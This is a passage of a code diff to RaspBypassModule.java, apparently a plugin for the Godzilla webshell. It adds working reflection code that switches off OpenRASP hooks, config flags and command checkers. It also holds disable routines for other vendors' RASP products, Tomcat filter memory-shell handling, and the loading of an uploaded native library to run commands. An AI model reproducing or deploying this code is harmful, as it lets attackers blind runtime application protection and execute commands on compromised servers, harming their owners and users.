+            if (a.indexOf(' ') >= 0 || a.indexOf('\t') >= 0) {
+                sb.append('"').append(a.replace("\"", "\\\"")).append('"');
+            } else {
+                sb.append(a);
+            }
+        }
+        return sb.toString();
     }
     
     // ==================== Method 6: Tomcat-JNI ====================
@@ -560,11 +816,11 @@ public class RaspBypassModule {
             
             procCreateMethod.invoke(null, proc, cmdParts[0], cmdParts, new String[0], procattr, pool);
             
-            return "Tomcat-JNI: Command executed (no output capture)".getBytes();
+            return "Tomcat-JNI: Command executed (no output capture)".getBytes(StandardCharsets.UTF_8);
         } catch (ClassNotFoundException e) {
-            return "Tomcat-JNI: Library not found".getBytes();
+            return "Tomcat-JNI: Library not found".getBytes(StandardCharsets.UTF_8);
         } catch (Exception e) {
-            return ("Tomcat-JNI error: " + e.getMessage()).getBytes();
+            return ("Tomcat-JNI error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
@@ -575,7 +831,7 @@ public class RaspBypassModule {
             disableRaspHooks();
             return execNormal(cmd);
         } catch (Exception e) {
-            return ("Reflection bypass error: " + e.getMessage()).getBytes();
+            return ("Reflection bypass error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
@@ -585,7 +841,7 @@ public class RaspBypassModule {
         try {
             return execUnsafe(cmd);
         } catch (Exception e) {
-            return ("ForkAndExec error: " + e.getMessage()).getBytes();
+            return ("ForkAndExec error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
@@ -682,7 +938,7 @@ public class RaspBypassModule {
             result.append("  (\u672a\u53d1\u73b0\u5f02\u5e38 RASP/hook/instrument \u6808\u5e27\uff0c\u5df2\u6392\u9664\u672c\u63d2\u4ef6\u81ea\u8eab)\n");
         }
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     private void appendCheckLine(StringBuilder result, String label, String className) {
@@ -742,12 +998,23 @@ public class RaspBypassModule {
         sb.append("  ").append(sc == null ? "\u65e0\uff08\u9700\u5728 HTTP \u8bf7\u6c42\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff09" : sc.getClass().getName()).append("\n");
         
         sb.append("\n[RASP \u542f\u53d1\u5f0f\u5224\u65ad]\n");
-        sb.append("  detectRasp(): ").append(detectRasp()).append(" \u2014 true \u8868\u793a\u547d\u4e2d\u5e38\u89c1 RASP \u7c7b\u6216\u6808\u5173\u952e\u5b57\n");
-        
+        List<String> vendors = detectRaspVendors();
+        boolean has = !vendors.isEmpty();
+        sb.append("  detectRasp(): ").append(has).append(" (vendor classes)\n");
+        sb.append("  stackHint: ").append(detectRaspStackHint()).append("\n");
+        sb.append("  vendors: ").append(vendors.isEmpty() ? "none" : vendors.toString()).append("\n");
+        sb.append("  jniLoaded: ").append(jniLoaded).append("\n");
+        sb.append("  summary: ").append(detectSummaryLine()).append("\n");
+
+        List<Integer> plan = planStrategies(has, jniLoaded);
+        sb.append("\n[PLAN \u63a8\u8350\u7b56\u7565\u94fe]\n");
+        sb.append("  ").append(planToNames(plan)).append("\n");
+
         sb.append("\n[\u8bf4\u660e]\n");
-        sb.append("  - \u52fe\u9009\u300c\u81ea\u52a8\u63a2\u6d4b\u300d\u6267\u884c\u547d\u4ee4\u65f6\uff1a\u5148\u8f6f\u7981\u7528(OpenRASP/JRASP)\uff0c\u518d\u5c1d\u8bd5\u666e\u901a ProcessBuilder\uff0c\u5931\u8d25\u540e\u8d70\u6df1\u5ea6\u7ed5\u8fc7\u94fe\u3002\n");
-        sb.append("  - \u5efa\u8bae\u5148\u70b9\u300c\u68c0\u67e5 RASP \u72b6\u6001\u300d\u548c\u672c\u6307\u7eb9\uff0c\u518d\u505a\u9ad8\u566a\u58f0\u64cd\u4f5c\u3002\n");
-        
+        sb.append("  - \u4e00\u952e\u6267\u884c\uff08auto\uff09: Detect\u2192Plan\u2192Exec\u2192Verify\uff08\u968f\u673a\u56de\u663e\u6807\u8bb0\uff0c\u9632\u7a7a\u56de\u663e\u5047\u6210\u529f\uff09\n");
+        sb.append("  - \u6709 RASP \u65f6\u5148\u8f6f\u964d\u7ea7\uff0c\u518d\u6309\u7b56\u7565\u94fe\u6df1\u5ea6\u5c1d\u8bd5\uff1bJNI \u5df2\u52a0\u8f7d\u5219\u63d0\u524d\n");
+        sb.append("  - Disable / \u5185\u5b58\u9a6c\u4e0d\u8d70\u81ea\u52a8\u7ba1\u7ebf\uff0c\u9700\u5728\u9ad8\u7ea7 Tab \u624b\u52a8\n");
+
         return sb.toString().getBytes(StandardCharsets.UTF_8);
     }
 
@@ -767,11 +1034,11 @@ public class RaspBypassModule {
                 result.append(disableJrasp(action));
             } else if (raspType.contains("Elkeid")) {
                 result.append(disableElkeid(action));
-            } else if (raspType.contains("QingTeng") || raspType.contains("青藤")) {
+            } else if (raspType.contains("QingTeng") || raspType.contains("\u9752\u85e4")) {
                 result.append(disableQingTeng(action));
-            } else if (raspType.contains("Tencent") || raspType.contains("腾讯")) {
+            } else if (raspType.contains("Tencent") || raspType.contains("\u817e\u8baf")) {
                 result.append(disableTencentRasp(action));
-            } else if (raspType.contains("Aliyun") || raspType.contains("阿里")) {
+            } else if (raspType.contains("Aliyun") || raspType.contains("\u963f\u91cc")) {
                 result.append(disableAliyunRasp(action));
             } else {
                 result.append(disableGenericRasp());
@@ -780,7 +1047,7 @@ public class RaspBypassModule {
             result.append("Error: " + e.getMessage() + "\n");
         }
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     private String disableOpenRasp(String action) {
@@ -790,15 +1057,8 @@ public class RaspBypassModule {
             Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
             
             if ("disableHook".equals(action)) {
-                if (tryInvokeNoArgStatic(hookHandlerClass, "disableHook", result)
-                    || tryInvokeNoArgStatic(hookHandlerClass, "disable", result)) {
-                    result.append("[+] OpenRASP static disable method invoked\n");
-                }
-                openRaspSetEnableHookFalse(hookHandlerClass, result);
-                try {
-                    tryOpenRaspConfigBooleanFields(Class.forName("com.baidu.openrasp.config.Config"), result);
-                } catch (Exception ignored) {
-                }
+                // Full deep soft-disable (hooks + config + TL + checkers)
+                disableRaspHooks(result);
             } else if ("modifyConfig".equals(action)) {
                 Class<?> configClass = Class.forName("com.baidu.openrasp.config.Config");
                 Method getConfigMethod = configClass.getMethod("getConfig");
@@ -978,7 +1238,7 @@ public class RaspBypassModule {
     
     private String disableElkeid(String action) {
         StringBuilder result = new StringBuilder();
-        result.append("[*] Elkeid (ByteDance) — best-effort reflection disable\n");
+        result.append("[*] Elkeid (ByteDance) \u2014 best-effort reflection disable\n");
         int ok = 0;
         String[] agentClasses = new String[]{
             "com.bytedance.elkeid.agent.Agent",
@@ -1391,7 +1651,7 @@ public class RaspBypassModule {
         result.append(uninstallViaClassLoader());
         result.append(uninstallViaTransformerRemoval());
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
     
     private String uninstallViaAgent() {
@@ -1541,7 +1801,7 @@ public class RaspBypassModule {
         
         result.append("\n[+] Universal disable completed!\n");
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
     
     private String setupBypassHooks() {
@@ -1638,14 +1898,199 @@ public class RaspBypassModule {
     }
     
     private void disableRaspHooks() {
+        disableRaspHooks(new StringBuilder());
+    }
+
+    /**
+     * Deep OpenRASP soft-disable: enableHook off, config flags, ThreadLocal clear,
+     * best-effort command checker mute. All best-effort across versions.
+     */
+    private void disableRaspHooks(StringBuilder log) {
+        if (log == null) {
+            log = new StringBuilder();
+        }
         try {
             Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
-            StringBuilder sb = new StringBuilder();
-            tryInvokeNoArgStatic(hookHandlerClass, "disableHook", sb);
-            openRaspSetEnableHookFalse(hookHandlerClass, sb);
-        } catch (Exception ignored) {
+            log.append("[OpenRASP] HookHandler present\n");
+            snapshotOpenRaspEnableHook(hookHandlerClass, log, "before");
+            tryInvokeNoArgStatic(hookHandlerClass, "disableHook", log);
+            tryInvokeNoArgStatic(hookHandlerClass, "disable", log);
+            openRaspSetEnableHookFalse(hookHandlerClass, log);
+            clearStaticThreadLocals(hookHandlerClass, log, "HookHandler");
+            snapshotOpenRaspEnableHook(hookHandlerClass, log, "after");
+        } catch (ClassNotFoundException e) {
+            log.append("[OpenRASP] HookHandler not found\n");
+        } catch (Throwable t) {
+            log.append("[OpenRASP] HookHandler err: ").append(t.getMessage()).append('\n');
+        }
+
+        try {
+            Class<?> configClass = Class.forName("com.baidu.openrasp.config.Config");
+            try {
+                Method getConfigMethod = configClass.getMethod("getConfig");
+                Object config = getConfigMethod.invoke(null);
+                if (config != null) {
+                    setBooleanFieldBestEffort(config, "disableHooks", true, log, "Config.disableHooks");
+                    setBooleanFieldBestEffort(config, "hookWhiteAll", true, log, "Config.hookWhiteAll");
+                }
+            } catch (Throwable ignored) {
+            }
+            tryOpenRaspConfigBooleanFields(configClass, log);
+            clearStaticThreadLocals(configClass, log, "Config");
+        } catch (ClassNotFoundException ignored) {
+        } catch (Throwable t) {
+            log.append("[OpenRASP] Config err: ").append(t.getMessage()).append('\n');
+        }
+
+        String[] extra = new String[]{
+            "com.baidu.openrasp.plugin.checker.CheckParameter",
+            "com.baidu.openrasp.plugin.checker.CheckerManager",
+            "com.baidu.openrasp.request.HttpRequest",
+            "com.baidu.openrasp.request.AbstractRequest"
+        };
+        for (String cn : extra) {
+            try {
+                Class<?> c = Class.forName(cn);
+                clearStaticThreadLocals(c, log, c.getSimpleName());
+                muteCommandRelatedBooleans(c, log);
+            } catch (Throwable ignored) {
+            }
+        }
+        openRaspMuteCommandCheckers(log);
+    }
+
+    private void snapshotOpenRaspEnableHook(Class<?> hookHandlerClass, StringBuilder log, String tag) {
+        try {
+            Field enableHookField = getDeclaredField(hookHandlerClass, "enableHook");
+            enableHookField.setAccessible(true);
+            Object enableHook = enableHookField.get(null);
+            log.append("[OpenRASP] enableHook(").append(tag).append(")=").append(enableHook).append('\n');
+        } catch (Throwable t) {
+            log.append("[OpenRASP] enableHook(").append(tag).append(") unreadable\n");
         }
     }
+
+    private void clearStaticThreadLocals(Class<?> clazz, StringBuilder log, String label) {
+        if (clazz == null) {
+            return;
+        }
+        try {
+            Field[] fields = clazz.getDeclaredFields();
+            for (Field f : fields) {
+                try {
+                    if (!Modifier.isStatic(f.getModifiers())) {
+                        continue;
+                    }
+                    if (!ThreadLocal.class.isAssignableFrom(f.getType())) {
+                        continue;
+                    }
+                    f.setAccessible(true);
+                    Object tl = f.get(null);
+                    if (tl instanceof ThreadLocal) {
+                        ((ThreadLocal) tl).remove();
+                        log.append("[+] ").append(label).append('.').append(f.getName()).append(" ThreadLocal.remove()\n");
+                    }
+                } catch (Throwable ignored) {
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private void setBooleanFieldBestEffort(Object target, String name, boolean value, StringBuilder log, String tag) {
+        try {
+            Field f = getDeclaredField(target.getClass(), name);
+            f.setAccessible(true);
+            stripFinalIfNeeded(f);
+            if (f.getType() == boolean.class) {
+                f.setBoolean(target, value);
+                log.append("[+] ").append(tag).append('=').append(value).append('\n');
+            } else if (f.getType() == Boolean.class) {
+                f.set(target, Boolean.valueOf(value));
+                log.append("[+] ").append(tag).append('=').append(value).append('\n');
+            } else if (AtomicBoolean.class.isAssignableFrom(f.getType())) {
+                Object ab = f.get(target);
+                if (ab instanceof AtomicBoolean) {
+                    ((AtomicBoolean) ab).set(value);
+                    log.append("[+] ").append(tag).append("(AtomicBoolean)=").append(value).append('\n');
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private void muteCommandRelatedBooleans(Class<?> clazz, StringBuilder log) {
+        String[] names = new String[]{
+            "enableHook", "hookEnable", "pluginEnable", "checkEnable", "enableCheck",
+            "commandEnable", "cmdEnable", "enable", "enabled", "active"
+        };
+        for (String n : names) {
+            try {
+                Field f = getDeclaredField(clazz, n);
+                if (!Modifier.isStatic(f.getModifiers())) {
+                    continue;
+                }
+                f.setAccessible(true);
+                stripFinalIfNeeded(f);
+                if (f.getType() == boolean.class) {
+                    f.setBoolean(null, false);
+                    log.append("[+] ").append(clazz.getSimpleName()).append('.').append(n).append("=false\n");
+                } else if (f.getType() == Boolean.class) {
+                    f.set(null, Boolean.FALSE);
+                    log.append("[+] ").append(clazz.getSimpleName()).append('.').append(n).append("=false\n");
+                } else if (AtomicBoolean.class.isAssignableFrom(f.getType())) {
+                    Object ab = f.get(null);
+                    if (ab instanceof AtomicBoolean) {
+                        ((AtomicBoolean) ab).set(false);
+                        log.append("[+] ").append(clazz.getSimpleName()).append('.').append(n).append("(AtomicBoolean)=false\n");
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+    }
+
+    /** Best-effort: remove command-ish checker map entries if present. */
+    private void openRaspMuteCommandCheckers(StringBuilder log) {
+        String[] managerNames = new String[]{
+            "com.baidu.openrasp.plugin.checker.CheckerManager",
+            "com.baidu.openrasp.plugin.checker.CheckParameter"
+        };
+        for (String cn : managerNames) {
+            try {
+                Class<?> c = Class.forName(cn);
+                for (Field f : c.getDeclaredFields()) {
+                    if (!Modifier.isStatic(f.getModifiers())) {
+                        continue;
+                    }
+                    try {
+                        f.setAccessible(true);
+                        Object v = f.get(null);
+                        if (v instanceof Map) {
+                            Map m = (Map) v;
+                            Object[] keys = m.keySet().toArray();
+                            int removed = 0;
+                            for (Object k : keys) {
+                                String ks = String.valueOf(k).toLowerCase(Locale.ROOT);
+                                if (ks.contains("command") || ks.contains("cmd") || ks.contains("process")
+                                        || ks.contains("runtime") || ks.contains("exec")) {
+                                    m.remove(k);
+                                    removed++;
+                                }
+                            }
+                            if (removed > 0) {
+                                log.append("[+] ").append(c.getSimpleName()).append('.').append(f.getName())
+                                        .append(" removed ").append(removed).append(" command-ish entries\n");
+                            }
+                        }
+                    } catch (Throwable ignored) {
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+    }
+
     
     // ==================== Memory Shell Injection ====================
     
@@ -1678,7 +2123,7 @@ public class RaspBypassModule {
             result.append("[-] Error: " + e.getMessage() + "\n");
         }
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     private String memShellFilterName(String urlPath) {
@@ -2108,7 +2553,7 @@ public class RaspBypassModule {
         try {
             Object sc = memShellGetServletContext();
             if (sc != null && memShellGetStandardContext(sc) != null) {
-                result.append("[*] Embedded Tomcat detected under Spring — using Tomcat Filter injection\n");
+                result.append("[*] Embedded Tomcat detected under Spring \u2014 using Tomcat Filter injection\n");
                 result.append(injectTomcatFilter(urlPath));
                 return result.toString();
             }
@@ -2122,7 +2567,7 @@ public class RaspBypassModule {
             
             if (requestAttributes != null) {
                 result.append("[+] Spring RequestAttributes present\n");
-                result.append("[!] No embedded StandardContext from this request — register Filter via Tomcat/Jetty tab or war layout\n");
+                result.append("[!] No embedded StandardContext from this request \u2014 register Filter via Tomcat/Jetty tab or war layout\n");
                 result.append("[+] Target path hint: ").append(urlPath).append("\n");
             } else {
                 result.append("[-] RequestAttributes null (call from HTTP request thread)\n");
@@ -2218,12 +2663,12 @@ public class RaspBypassModule {
                 Object sc = memShellGetServletContext();
                 if (sc == null) {
                     result.append("[-] No ServletContext\n");
-                    return result.toString().getBytes();
+                    return result.toString().getBytes(StandardCharsets.UTF_8);
                 }
                 Object standardContext = memShellGetStandardContext(sc);
                 if (standardContext == null) {
                     result.append("[-] StandardContext not found\n");
-                    return result.toString().getBytes();
+                    return result.toString().getBytes(StandardCharsets.UTF_8);
                 }
                 String filterName = memShellFilterName(urlPath != null ? urlPath : "/shell");
                 try {
@@ -2245,70 +2690,190 @@ public class RaspBypassModule {
         } else {
             result.append("[!] Only Tomcat Filter removal by name is implemented; redeploy context to clear others\n");
         }
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     // ==================== JNI Library Loading ====================
-    
+
+    /**
+     * Load native lib from target path and/or uploaded bytes (libBytes/soBytes/dllBytes).
+     * Empty path + bytes -> write under java.io.tmpdir/gsl_rasp_jni/.
+     */
     public byte[] loadJniLibrary() {
         String soPath = getString("soPath");
-        
+        if (soPath == null || soPath.trim().isEmpty()) {
+            soPath = getString("path");
+        }
+        if (soPath == null || soPath.trim().isEmpty()) {
+            soPath = getString("jniPath");
+        }
+        byte[] libBytes = getBytes("libBytes");
+        if (libBytes == null || libBytes.length == 0) {
+            libBytes = getBytes("soBytes");
+        }
+        if (libBytes == null || libBytes.length == 0) {
+            libBytes = getBytes("dllBytes");
+        }
+        String libName = getString("libName");
+        if (libName == null || libName.trim().isEmpty()) {
+            libName = getString("soName");
+        }
+
         StringBuilder result = new StringBuilder();
         result.append("=== JNI Library Loading ===\n");
-        result.append("Path: " + soPath + "\n\n");
-        
+        result.append("Path: ").append(soPath).append("\n");
+        result.append("libBytes: ").append(libBytes == null ? 0 : libBytes.length).append("\n\n");
+
         try {
-            System.load(soPath);
+            String log = tryLoadViaHelper(soPath, libBytes, libName);
+            if (log != null) {
+                result.append(log);
+                if (log.contains("LOADED:")) {
+                    jniLoaded = true;
+                    int i = log.indexOf("LOADED:");
+                    int nl = log.indexOf('\n', i);
+                    jniPath = nl > i ? log.substring(i + 7, nl).trim() : soPath;
+                }
+                return result.toString().getBytes(StandardCharsets.UTF_8);
+            }
+        } catch (Throwable ignored) {
+        }
+
+        try {
+            if ((soPath == null || soPath.trim().isEmpty()) && (libBytes == null || libBytes.length == 0)) {
+                result.append("[-] Need soPath on target or libBytes from client (embedded dll)\n");
+                return result.toString().getBytes(StandardCharsets.UTF_8);
+            }
+            File libFile;
+            if (libBytes != null && libBytes.length > 0) {
+                String name = (libName != null && libName.trim().length() > 0)
+                        ? new File(libName.trim()).getName()
+                        : (isWindowsOs() ? "rasp_bypass_win_x64.dll" : "rasp_bypass_linux_x64.so");
+                File dir = new File(System.getProperty("java.io.tmpdir", "."), "gsl_rasp_jni");
+                dir.mkdirs();
+                libFile = new File(dir, name);
+                FileOutputStream fos = new FileOutputStream(libFile);
+                try {
+                    fos.write(libBytes);
+                } finally {
+                    fos.close();
+                }
+            } else {
+                libFile = new File(soPath.trim());
+            }
+            result.append("file: ").append(libFile.getAbsolutePath()).append("\n");
+            System.load(libFile.getAbsolutePath());
             result.append("[+] Library loaded successfully!\n");
             jniLoaded = true;
-            jniPath = soPath;
+            jniPath = libFile.getAbsolutePath();
         } catch (UnsatisfiedLinkError e) {
             String m = e.getMessage() != null ? e.getMessage() : "";
             if (m.contains("already loaded")) {
                 if (m.contains("another classloader")) {
-                    result.append("[-] DLL \u5df2\u88ab\u5176\u4ed6 ClassLoader \u52a0\u8f7d\uff0c\u5f53\u524d\u63d2\u4ef6\u5b9e\u4f8b\u65e0\u6cd5\u7ed1\u5b9a JNI\u3002\u8bf7\u91cd\u8fde Shell \u6216\u91cd\u65b0\u6253\u5305\u6700\u65b0 payload\uff08include \u590d\u7528\u540c\u4e00 ClassLoader\uff09\u540e\u518d\u300c\u52a0\u8f7d JNI\u300d\u3002\n");
+                    result.append("[-] DLL already in another ClassLoader; reconnect shell.\n");
                     result.append("    ").append(m).append("\n");
                 } else {
                     jniLoaded = true;
                     jniPath = soPath;
-                    result.append("[+] \u5e93\u5df2\u5728\u672c ClassLoader \u52a0\u8f7d\uff0c\u8df3\u8fc7\u91cd\u590d load\n");
+                    result.append("[+] already loaded in this ClassLoader\n");
                 }
             } else {
                 result.append("[-] UnsatisfiedLinkError: ").append(m).append("\n");
             }
         } catch (Exception e) {
-            result.append("[-] Error: " + e.getMessage() + "\n");
+            result.append("[-] Error: ").append(e.getMessage()).append("\n");
         }
-        
-        return result.toString().getBytes();
+
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
+
+    private String tryLoadViaHelper(String soPath, byte[] libBytes, String libName) {
+        try {
+            Class<?> c = Class.forName("shells.plugins.java.assets.RaspNativeLoader");
+            Method m = c.getMethod("loadLibrary", String.class, byte[].class, String.class);
+            Object r = m.invoke(null, soPath, libBytes, libName);
+            return r != null ? r.toString() : null;
+        } catch (ClassNotFoundException e) {
+            return null;
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    /** Best-effort load if session has libBytes/soPath (pipeline / execViaJni). */
+    private boolean ensureJniLoadedForPipeline() {
+        return ensureJniLoadedForPipeline(new StringBuilder());
+    }
+
+    private boolean ensureJniLoadedForPipeline(StringBuilder detail) {
+        if (detail == null) {
+            detail = new StringBuilder();
+        }
+        if (jniLoaded) {
+            detail.append("already-loaded");
+            return true;
+        }
+        byte[] libBytes = getBytes("libBytes");
+        if (libBytes == null || libBytes.length == 0) {
+            libBytes = getBytes("soBytes");
+        }
+        if (libBytes == null || libBytes.length == 0) {
+            libBytes = getBytes("dllBytes");
+        }
+        String soPath = getString("soPath");
+        if (soPath == null || soPath.trim().isEmpty()) {
+            soPath = getString("path");
+        }
+        if (soPath == null || soPath.trim().isEmpty()) {
+            soPath = getString("jniPath");
+        }
+        detail.append("libBytes=").append(libBytes == null ? 0 : libBytes.length);
+        detail.append(" soPath=").append(soPath == null ? "" : soPath);
+        if ((libBytes == null || libBytes.length == 0)
+                && (soPath == null || soPath.trim().isEmpty())) {
+            return false;
+        }
+        byte[] log = loadJniLibrary();
+        String ls = log == null ? "" : new String(log, StandardCharsets.UTF_8);
+        detail.append(" loadLog=").append(abbreviate(ls.replace('\n', ' '), 160));
+        boolean ok = jniLoaded || ls.contains("LOADED:") || ls.contains("loaded successfully")
+                || ls.contains("already loaded in this ClassLoader");
+        if (ok) {
+            jniLoaded = true;
+        }
+        return ok;
+    }
+
 
     public byte[] execViaJni() {
         String cmd = getCommandLine();
-        
+
         StringBuilder result = new StringBuilder();
         result.append("=== JNI Execution ===\n");
-        result.append("Command: " + cmd + "\n\n");
-        
+        result.append("Command: ").append(cmd).append("\n\n");
+
         try {
             if (!jniLoaded) {
-                result.append("[-] JNI library not loaded. Load first.\n");
-                return result.toString().getBytes();
+                ensureJniLoadedForPipeline();
+            }
+            if (!jniLoaded) {
+                result.append("[-] JNI library not loaded. Load first (or send libBytes).\n");
+                return result.toString().getBytes(StandardCharsets.UTF_8);
             }
             try {
                 String nativeOut = jniExec(cmd);
                 result.append(nativeOut != null ? nativeOut : "");
-                return result.toString().getBytes();
+                return result.toString().getBytes(StandardCharsets.UTF_8);
             } catch (UnsatisfiedLinkError ule) {
-                result.append("[!] jniExec \u672a\u7ed1\u5b9a\uff1a\u7c7b\u540d\u88ab\u968f\u673a\u5316\u540e\u4e0e DLL \u5bfc\u51fa\u7b26\u4e0d\u5339\u914d\uff08\u9700\u5ba2\u6237\u7aef\u4fdd\u7559 RaspBypassModule \u5168\u9650\u5b9a\u540d\uff09\u3002\u8be6\u60c5: ");
+                result.append("[!] jniExec not bound (FQN must stay shells.plugins.java.assets.RaspBypassModule): ");
                 result.append(ule.getMessage()).append("\n");
-                result.append(new String(execTomcatJni(cmd)));
+                result.append(new String(execTomcatJni(cmd), StandardCharsets.UTF_8));
             }
         } catch (Throwable e) {
             result.append("[-] Error: ").append(e.getMessage()).append("\n");
         }
-        
-        return result.toString().getBytes();
+
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     // ==================== Utility Tools ====================
@@ -2335,7 +2900,7 @@ public class RaspBypassModule {
             result.append("[-] Error: " + e.getMessage() + "\n");
         }
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     public byte[] createSymlink() {
@@ -2360,7 +2925,7 @@ public class RaspBypassModule {
             result.append("[-] Error: " + e.getMessage() + "\n");
         }
         
-        return result.toString().getBytes();
+        return result.toString().getBytes(StandardCharsets.UTF_8);
     }
 
     // ==================== Helper Methods ====================
@@ -2375,6 +2940,9 @@ public class RaspBypassModule {
     
     private byte[] readStream(InputStream in) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
+        if (in == null) {
+            return out.toByteArray();
+        }
         byte[] buffer = new byte[4096];
         int bytesRead;
         while ((bytesRead = in.read(buffer)) != -1) {
@@ -2382,10 +2950,134 @@ public class RaspBypassModule {
         }
         return out.toByteArray();
     }
+
+    /**
+     * Collect stdout+stderr, wait for exit, normalize Windows console charset to UTF-8
+     * so the Godzilla client {@code utf8(bytes)} path shows whoami etc. correctly.
+     */
+    private byte[] drainProcess(Process process, int timeoutSec) throws Exception {
+        if (process == null) {
+            return new byte[0];
+        }
+        final ByteArrayOutputStream stdout = new ByteArrayOutputStream();
+        final ByteArrayOutputStream stderr = new ByteArrayOutputStream();
+        Thread tOut = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    byte[] b = readStream(process.getInputStream());
+                    if (b != null) {
+                        stdout.write(b);
+                    }
+                } catch (Throwable ignored) {
+                }
+            }
+        }, "rasp-stdout");
+        Thread tErr = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    byte[] b = readStream(process.getErrorStream());
+                    if (b != null) {
+                        stderr.write(b);
+                    }
+                } catch (Throwable ignored) {
+                }
+            }
+        }, "rasp-stderr");
+        tOut.setDaemon(true);
+        tErr.setDaemon(true);
+        tOut.start();
+        tErr.start();
+        boolean finished = process.waitFor(timeoutSec, TimeUnit.SECONDS);
+        if (!finished) {
+            try {
+                process.destroy();
+            } catch (Throwable ignored) {
+            }
+        }
+        tOut.join(2000);
+        tErr.join(2000);
+        byte[] outBytes = stdout.toByteArray();
+        byte[] errBytes = stderr.toByteArray();
+        if (outBytes.length == 0 && errBytes.length > 0) {
+            outBytes = errBytes;
+        } else if (errBytes.length > 0) {
+            ByteArrayOutputStream merged = new ByteArrayOutputStream(outBytes.length + errBytes.length + 16);
+            merged.write(outBytes);
+            if (outBytes.length > 0 && outBytes[outBytes.length - 1] != (byte) '\n') {
+                merged.write((byte) '\n');
+            }
+            merged.write(errBytes);
+            outBytes = merged.toByteArray();
+        }
+        if (!finished && outBytes.length == 0) {
+            return ("Process timeout after " + timeoutSec + "s").getBytes(StandardCharsets.UTF_8);
+        }
+        return normalizeProcessOutputToUtf8(outBytes);
+    }
+
+    /** Windows cmd often emits GBK/system encoding; convert to UTF-8 for client display. */
+    private byte[] normalizeProcessOutputToUtf8(byte[] raw) {
+        if (raw == null || raw.length == 0) {
+            return raw == null ? new byte[0] : raw;
+        }
+        // Already valid UTF-8 with multi-byte CJK? keep
+        if (looksLikeUtf8(raw)) {
+            return raw;
+        }
+        if (isWindowsOs()) {
+            try {
+                String enc = System.getProperty("sun.jnu.encoding");
+                if (enc == null || enc.trim().isEmpty()) {
+                    enc = System.getProperty("file.encoding", "GBK");
+                }
+                String text = new String(raw, enc);
+                return text.getBytes(StandardCharsets.UTF_8);
+            } catch (Throwable ignored) {
+                try {
+                    return new String(raw, "GBK").getBytes(StandardCharsets.UTF_8);
+                } catch (Throwable ignored2) {
+                }
+            }
+        }
+        return raw;
+    }
+
+    private static boolean looksLikeUtf8(byte[] raw) {
+        int i = 0;
+        boolean sawMb = false;
+        while (i < raw.length) {
+            int b = raw[i] & 0xff;
+            if (b <= 0x7f) {
+                i++;
+                continue;
+            }
+            int need;
+            if ((b & 0xe0) == 0xc0) {
+                need = 1;
+            } else if ((b & 0xf0) == 0xe0) {
+                need = 2;
+            } else if ((b & 0xf8) == 0xf0) {
+                need = 3;
+            } else {
+                return false;
+            }
+            if (i + need >= raw.length) {
+                return false;
+            }
+            for (int k = 1; k <= need; k++) {
+                if ((raw[i + k] & 0xc0) != 0x80) {
+                    return false;
+                }
+            }
+            sawMb = true;
+            i += need + 1;
+        }
+        return true;
+    }
     
     private byte[] toCString(String s) {
         if (s == null) return null;
-        byte[] bytes = s.getBytes();
+        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
         byte[] result = new byte[bytes.length + 1];
         System.arraycopy(bytes, 0, result, 0, bytes.length);
         result[result.length - 1] = (byte) 0;
